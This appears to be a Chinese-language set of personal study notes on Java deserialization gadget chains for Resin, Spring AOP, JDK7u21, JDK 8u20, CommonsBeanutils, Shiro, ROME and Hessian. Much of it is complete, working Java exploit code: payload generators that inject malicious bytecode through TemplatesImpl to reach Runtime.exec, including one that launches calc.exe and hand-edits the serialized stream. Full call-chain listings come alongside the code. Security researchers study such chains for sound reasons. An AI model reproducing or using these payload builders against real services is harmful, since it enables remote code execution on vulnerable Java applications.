QName 实际上是 Resin 对上下文 Context 的一种封装，它的 toString 方法会调用其封装类的 composeName 方法获取复合上下文的名称。用链使用了 javax.naming.spi.ContinuationContext 类，其 composeName 方法调用 getTargetContext 方法，然后调用 NamingManager#getContext 方法传入其成员变量 CannotProceedException 的相关属性。

漏洞触发点在 NamingManager#getObjectInstance 方法，这个方法调用 VersionHelper 加载类并实例化加载时使用了 URLClassLoader 并指定了类名和 codebase这个逻辑就赋予了程序远程加载类的功能，也就是漏洞的最终利用点。。
### ContinuationContext
ContinuationContext是ContinuationDirContext的父类
#### getTargetContext-&gt;NamingManager.getContext



### XString (com.sun.org.apache.xpath.internal.objects)  
#### 前HotSwappableTargetSource.equal  后AspectJAwareAdvisorAutoProxyCreator.toString| rome的ToStringBean.toString| xbean-naming::Binding.tostring-&gt;&gt;NamingManager.getObjectFactoryFromReference
#### 前HashMap.putVal() 后 resin::QName.toString()	
QName 实际上是 Resin 对上下文 Context 的一种封装，它的 toString 方法会调用其封装类的 composeName 方法获取复合上下文的名称。

### spring-aop
####  HotSwappableTargetSource利用链    后this.target（XString）的equals -&gt;
这个类的作用是 在代理bean运行过程中，动态更新java对象
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ToStringBean.toString</span><br><span class="line">XString.equals()</span><br><span class="line">HotSwappableTargetSource.equals()</span><br><span class="line">HashMap.putVal()</span><br><span class="line">HashMap.readObject()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
#### AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder  后BeanFactoryAspectInstanceFactory----&gt;JNDI:SimpleJndiBeanFactory
###  JDK7u21 动态代理   Hashset到动态代理到getAttribute()到defineclass
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;properties&gt;</span><br><span class="line">    &lt;maven.compiler.source&gt;7&lt;/maven.compiler.source&gt;</span><br><span class="line">    &lt;maven.compiler.target&gt;7&lt;/maven.compiler.target&gt;</span><br><span class="line">&lt;/properties&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">LinkedHashSet.readObject()</span><br><span class="line">  LinkedHashSet.add()</span><br><span class="line">    ...</span><br><span class="line">      TemplatesImpl.hashCode() (X)</span><br><span class="line">  LinkedHashSet.add()</span><br><span class="line">    ...</span><br><span class="line">      Proxy(Templates).hashCode() (X)</span><br><span class="line">        AnnotationInvocationHandler.invoke() (X)</span><br><span class="line">          AnnotationInvocationHandler.hashCodeImpl() (X)</span><br><span class="line">            String.hashCode() (0)</span><br><span class="line">            AnnotationInvocationHandler.memberValueHashCode() (X)</span><br><span class="line">              TemplatesImpl.hashCode() (X)</span><br><span class="line">      Proxy(Templates).equals()</span><br><span class="line">        AnnotationInvocationHandler.invoke()</span><br><span class="line">          AnnotationInvocationHandler.equalsImpl()</span><br><span class="line">            Method.invoke()</span><br><span class="line">              ...</span><br><span class="line">                TemplatesImpl.getOutputProperties()</span><br><span class="line">                  TemplatesImpl.newTransformer()</span><br><span class="line">                    TemplatesImpl.getTransletInstance()</span><br><span class="line">                      TemplatesImpl.defineTransletClasses()</span><br><span class="line">                        ClassLoader.defineClass()</span><br><span class="line">                        Class.newInstance()</span><br><span class="line">                          ...</span><br><span class="line">                            MaliciousClass.&lt;clinit&gt;()</span><br><span class="line">                              ...</span><br><span class="line">                                Runtime.exec()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class Jdk7u21 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        byte[] evilCode = SerializeUtil.getEvilCode();</span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">        SerializeUtil.setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;evilCode&#125;);</span><br><span class="line">        SerializeUtil.setFieldValue(templates,&quot;_name&quot;,&quot;feng&quot;);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;String, Object&gt; memberValues = new HashMap&lt;String, Object&gt;();</span><br><span class="line">        memberValues.put(&quot;f5a5a608&quot;,&quot;feng&quot;);</span><br><span class="line">        Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor cons = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        cons.setAccessible(true);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler)cons.newInstance(Templates.class, memberValues);//如果是TemplatesImpl.class的话，这么多Method，怎么能控制第一个就调用可以利用的newTransformer或者getOutputProperties呢？经过我调式，第一个调用的是init方法，而且会直接抛出异常，导致后面的方法没法调用。为什么Templates.class就可以？看一下Templates的接口就知道了：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Templates proxy = (Templates) Proxy.newProxyInstance(</span><br><span class="line">                Templates.class.getClassLoader(),</span><br><span class="line">                new Class[]&#123;Templates.class&#125;,</span><br><span class="line">                handler</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        HashSet hashSet = new LinkedHashSet();</span><br><span class="line">        hashSet.add(templates);  //这里有个顺序差 之前提的都是HashSet，为什么这里突然变成了LinkHashSet？因为想想整个的利用流程就知道，反序列化的时候2次put，必须第一次put的是TemplatesImpl对象，第二次是代理对象，才可以成功反序列化。说白了就是，次序上需要可控：</span><br><span class="line">        hashSet.add(proxy);</span><br><span class="line"></span><br><span class="line">        memberValues.put(&quot;f5a5a608&quot;,templates);</span><br><span class="line">        byte[] bytes = SerializeUtil.serialize(hashSet);</span><br><span class="line">        SerializeUtil.unserialize(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
### 8u20 
jdk7u21 的修复方式，是在 AnnotationInvocationHandler 的 readObject() 方法中尝试将 this.type 转换成 AnnotationType ，如果转换失败，就 throw Exception （而不是 直接 return ）：这样的后果是 ，内存中还有handler
如果把AnnotationInvocationHandler#readObject当成内层try catch嵌套在外层try catch中，反序列化的时候会在内存中留下完整的AnnotationInvocationHandler和对应的handler。而此后在真正需要用到AnnotationInvocationHandler的时候，ObjectInputStream会直接引用这个handler。
所以需要找到一个readObject流程里有try catch且不影响反序列化流程的类。


POC两个需要注意到的点
 javassist 给 AnnotationInvocationHandler 加一个 writeObjecct() 方法
删掉TC_ENDBLOCKDATA标志
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">public class Poc &#123;</span><br><span class="line">    public static Class newInvocationHandlerClass() throws Exception&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass clazz = pool.get(Gadgets.ANN_INV_HANDLER_CLASS);</span><br><span class="line">        CtMethod writeObject = CtMethod.make(&quot;    private void writeObject(java.io.ObjectOutputStream os) throws java.io.IOException &#123;\n&quot; +</span><br><span class="line">            &quot;        os.defaultWriteObject();\n&quot; +</span><br><span class="line">            &quot;    &#125;&quot;,clazz);</span><br><span class="line">        clazz.addMethod(writeObject);</span><br><span class="line">        return clazz.toClass();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        TemplatesImpl templates = (TemplatesImpl) Gadgets.createTemplatesImpl(&quot;calc.exe&quot;);</span><br><span class="line"></span><br><span class="line">        Class ihClass = newInvocationHandlerClass();</span><br><span class="line">        InvocationHandler ih = (InvocationHandler) Reflections.getFirstCtor(ihClass).newInstance(Override.class,new HashMap&lt;&gt;());</span><br><span class="line"></span><br><span class="line">        Reflections.setFieldValue(ih,&quot;type&quot;, Templates.class);</span><br><span class="line">        Templates proxy = Gadgets.createProxy(ih,Templates.class);</span><br><span class="line"></span><br><span class="line">        BeanContextSupport b = new BeanContextSupport();</span><br><span class="line">        Reflections.setFieldValue(b,&quot;serializable&quot;,1);</span><br><span class="line">        HashMap tmpMap = new HashMap&lt;&gt;();</span><br><span class="line">        tmpMap.put(ih,null);</span><br><span class="line">        Reflections.setFieldValue(b,&quot;children&quot;,tmpMap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        LinkedHashSet set = new LinkedHashSet();//这样可以确保先反序列化 templates 再反序列化 proxy</span><br><span class="line">        set.add(b);</span><br><span class="line">        set.add(templates);</span><br><span class="line">        set.add(proxy);</span><br><span class="line"></span><br><span class="line">        HashMap hm = new HashMap();</span><br><span class="line">        hm.put(&quot;f5a5a608&quot;,templates);</span><br><span class="line">        Reflections.setFieldValue(ih,&quot;memberValues&quot;,hm);</span><br><span class="line"></span><br><span class="line">        byte[] ser = Serializer.serialize(set);</span><br><span class="line"></span><br><span class="line">        byte[] shoudReplace = new byte[]&#123;0x78,0x70,0x77,0x04,0x00,0x00,0x00,0x00,0x78,0x71&#125;;</span><br><span class="line"></span><br><span class="line">        int i = ByteUtil.getSubarrayIndex(ser,shoudReplace);</span><br><span class="line">        ser = ByteUtil.deleteAt(ser,i); // delete 0x78</span><br><span class="line">        ser = ByteUtil.deleteAt(ser,i); // delete 0x70</span><br><span class="line"></span><br><span class="line">// 不能直接 Deserializer.deserialize(ser) , 除非 redefine 了 AnnotationInvocationHandler 否则会报错</span><br><span class="line">//        Deserializer.deserialize(ser);</span><br><span class="line">        ReadWrite.writeFile(ser,&quot;ser.txt&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### CB! 可以调用任意getproperty 后templateimpl rce
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line">public class CB1 &#123;</span><br><span class="line">    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">        setFieldValue(templates, &quot;_name&quot;, &quot;1vxyz&quot;);</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;evil.class路径&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, codes);</span><br><span class="line">        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        BeanComparator comparator = new BeanComparator();</span><br><span class="line">        PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);</span><br><span class="line">        queue.add(1);</span><br><span class="line">        queue.add(2);</span><br><span class="line"></span><br><span class="line">        setFieldValue(queue,&quot;queue&quot;,new Object[]&#123;templates,templates&#125;);// 设置BeanComparator.compare()的参数</span><br><span class="line">        setFieldValue(comparator,&quot;property&quot;,&quot;outputProperties&quot;);</span><br><span class="line">        serialize(queue);</span><br><span class="line">        unserialize(&quot;CB-bin/CB1.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void setFieldValue(Object object,String field_name,Object filed_value) throws NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">            Class clazz=object.getClass();</span><br><span class="line">            Field declaredField=clazz.getDeclaredField(field_name);</span><br><span class="line">            declaredField.setAccessible(true);</span><br><span class="line">            declaredField.set(object,filed_value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void serialize(Object obj) throws IOException &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;CB-bin/CB1.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object unserialize(String filename) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));</span><br><span class="line">        return ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
注意前面的CC2文章提到了，queue的size应该&gt;2。 而add()也会执行compare由于在BeanComparator#compare() 中，如果 this.property 为空，则直接比较这两个对象。这里实际上就是对1、2进行排序。

BeanComparator comparator = new BeanComparator();
PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);
queue.add(1);
queue.add(2);
初始化时使用正经对象，且 property 为空，这一系列操作是为了初始化的时候不要出错。然后，我们
再用反射将 property 的值设置成恶意的 outputProperties ，将add进队列里的1、2替换成恶意的
TemplateImpl 对象

setFieldValue(comparator,&quot;property&quot;,&quot;outputProperties&quot;);
与CC2/4 略微不同的是，还需要用反射去修改 queue属性的值，因为要控制 BeanComparator.compare()的参数为恶意templates对象

setFieldValue(queue,&quot;queue&quot;,new Object[]&#123;templates,templates&#125;);// 设置BeanComparator.compare()的参数

### cck1
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">java.util.HashSet.readObject()</span><br><span class="line">-&gt; java.util.HashMap.put()</span><br><span class="line">-&gt; java.util.HashMap.hash()</span><br><span class="line">    -&gt; org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">    -&gt; org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">        -&gt; org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">        -&gt; org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">            -&gt; java.lang.reflect.Method.invoke()</span><br><span class="line">      ... templates gadgets ...</span><br><span class="line">      -&gt; java.lang.Runtime.exec()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">package com.govuln.shiroattack;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class CommonsCollectionsShiro &#123;</span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public byte[] getPayload(byte[] clazzBytes) throws Exception &#123;</span><br><span class="line">        TemplatesImpl obj = new TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;clazzBytes&#125;);</span><br><span class="line">        setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);</span><br><span class="line">        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        Transformer transformer = new InvokerTransformer(&quot;getClass&quot;, null, null);</span><br><span class="line"></span><br><span class="line">        Map innerMap = new HashMap();</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformer);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tme = new TiedMapEntry(outerMap, obj);</span><br><span class="line"></span><br><span class="line">        Map expMap = new HashMap();</span><br><span class="line">        expMap.put(tme, &quot;valuevalue&quot;);</span><br><span class="line"></span><br><span class="line">        outerMap.clear();</span><br><span class="line">        setFieldValue(transformer, &quot;iMethodName&quot;, &quot;newTransformer&quot;);</span><br><span class="line"></span><br><span class="line">        // ==================</span><br><span class="line">        // 生成序列化字符串</span><br><span class="line">        ByteArrayOutputStream barr = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        return barr.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
### shiro  CB1  改造版
serialVersionUID问题

没找到 org.apache.commons.collections.comparators.ComparableComparator 类，从包名即可看出，这个类是来自于 commons-collections。commons-beanutils 本来依赖于 commons-collections，但是在 Shiro 中，它的 commons-beanutils 虽然包含了一部分 commons-collections 的类，但却不全。这也导致，正常使用 Shiro 的时候不需要依赖于 commons-collections，但反序列化利用的时候需要依赖于commons-collections。问题

CaseInsensitiveComparator 类是 java.lang.String 类下的一个内部私有类，其实现了 Comparator 和 Serializable ，且位于 Java 的核心代码中，兼容性强。

通过 String.CASE_INSENSITIVE_ORDER 即可拿到上下文中的 CaseInsensitiveComparator 对象，用它来实例化 BeanComparator :

1
final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);


解决两个问题后
##### 有两个版本 1. ReverseComparator
######  2. CaseInsensitiveComparator
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.beanutils.BeanComparator;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line">public class CommonsBeanutils1Shiro &#123;</span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj, value); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public byte[] getPayload(byte[] clazzBytes) throws Exception &#123;</span><br><span class="line">        TemplatesImpl obj = new TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;clazzBytes&#125;);</span><br><span class="line">        setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);</span><br><span class="line">        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line">        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">        final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);</span><br><span class="line">        // stub data for replacement later</span><br><span class="line">        queue.add(&quot;1&quot;);</span><br><span class="line">        queue.add(&quot;1&quot;);</span><br><span class="line">        setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;);</span><br><span class="line">        setFieldValue(queue, &quot;queue&quot;, new Object[]&#123;obj, obj&#125;);</span><br><span class="line">        // ==================</span><br><span class="line">        // 生成序列化字符串</span><br><span class="line">        ByteArrayOutputStream barr = new ByteArrayOutputStream(); </span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(barr); </span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">        return barr.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
### ROME  

#### ObjectBean 利用链
利用链：
TemplatesImpl.getOutputProperties()
ToStringBean.toString(String)
ToStringBean.toString()
EqualsBean.beanHashCode()
EqualsBean.hashCode()
ObjetBean.hashCode()
HashMap&lt;K,V&gt;.hash(Object)
HashMap&lt;K,V&gt;.readObject(ObjectInputStream)
#### HashTable 利用链
利用链：
TemplatesImpl.getOutputProperties()
ToStringBean.toString(String)
ToStringBean.toString()
EqualsBean.beanHashCode()
EqualsBean.hashCode()
ObjetBean.hashCode()
HashTable.reconstitutionPut()
HashTable.readObject(ObjectInputStream)
#### BadAttributeValueExpException 利用链
利用链：
TemplatesImpl.getOutputProperties()
ToStringBean.toString(String)
ToStringBean.toString()
BadAttributeValueExpException.readObject()
#### HotSwappableTargetSource 利用链
利用链：
TemplatesImpl.getOutputProperties()
ToStringBean.toString(String)
ToStringBean.toString
XString.equals()
HotSwappableTargetSource.equals()
HashMap.putVal()
HashMap.readObject()
#### JdbcRowSetImpl 利用链
利用链：
JdbcRowSetImpl.connect()
JdbcRowSetImpl.getDatabaseMetaData()
ToStringBean.toString(String)
ToStringBean.toString()
EqualsBean.beanHashCode()
EqualsBean.hashCode()
ObjetBean.hashCode()
HashMap&lt;K,V&gt;.hash(Object)
HashMap&lt;K,V&gt;.readObject(ObjectInputStream)
#### EqualsBean 利用链
利用链：
TemplatesImpl.getOutputProperties()
EqualsBean.beanEquals()
EqualsBean.equals()
AbstractMap.equals()
HashMap.putVal()
HashMap.put()
HashSet.readObject()

### Hessian  https://su18.org/post/hessian/#rome
#### Groovy

ConvertedClosure-》MethodClosure  doCall 方法进一步调用 ContinuationDirContext#listBindings
TreeMap.compareTo()
MapDeserializer.readMap()
SerializerFactory.readMap()
Hessian2Input.readObject()




#### ROME
JdbcRowSetImpl.getDatabaseMetaData()
ToStringBean.toString() (com.sun.syndication.feed.impl)
EqualsBean.beanHashCode() (com.sun.syndication.feed.impl)
ObjectBean.hashCode()
HashMap.hash()
HashMap.put()
MapDeserializer.readMap()
SerializerFactory.readMap()
Hessian2Input.readObject()

#### PartiallyComparableAdvisorHolder
SimpleJndiBeanFactory.doGetType() (org.springframework.jndi.support)
SimpleJndiBeanFactory.getType() (org.springframework.jndi.support)
BeanFactoryAspectInstanceFactory.getOrder() (org.springframework.aop.aspectj.annotation)
AbstractAspectJAdvice.getOrder (org.springframework.aop.aspectj)
AspectJPointcutAdvisor.getOrder() (org.springframework.aop.aspectj)
AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder.toString() (org.springframework.aop.aspectj.autoproxy)
XString.equals() (com.sun.org.apache.xpath.internal.objects)
HotSwappableTargetSource.equals()    (org.springframework.aop.target) //可忽略
HashMap.putVal()
HashMap.put()
MapDeserializer.readMap()
SerializerFactory.readMap()
Hessian2Input.readObject()
#### AbstractBeanFactoryPointcutAdvisor
SimpleJndiBeanFactory.getBean() (org.springframework.jndi.support)
AbstractBeanFactoryPointcutAdvisor.getAdvice()  (org.springframework.aop.support)  // 主要
AbstractPointcutAdvisor.equals()   (org.springframework.aop.support)
HotSwappableTargetSource.equals()    (org.springframework.aop.target) 
HashMap.putVal()
HashMap.put()
MapDeserializer.readMap()
SerializerFactory.readMap()
Hessian2Input.readObject()
#### Resin链
NamingManager.getObjectFactoryFromReference() (javax.naming.spi)
NamingManager.getObjectInstance() (javax.naming.spi)
NamingManager.getContext() (javax.naming.spi)
ContinuationContext.getTargetContext() (javax.naming.spi)
ContinuationContext.composeName() (javax.naming.spi)   // 关键点
QName.toString() (com.caucho.naming)     // 关键点
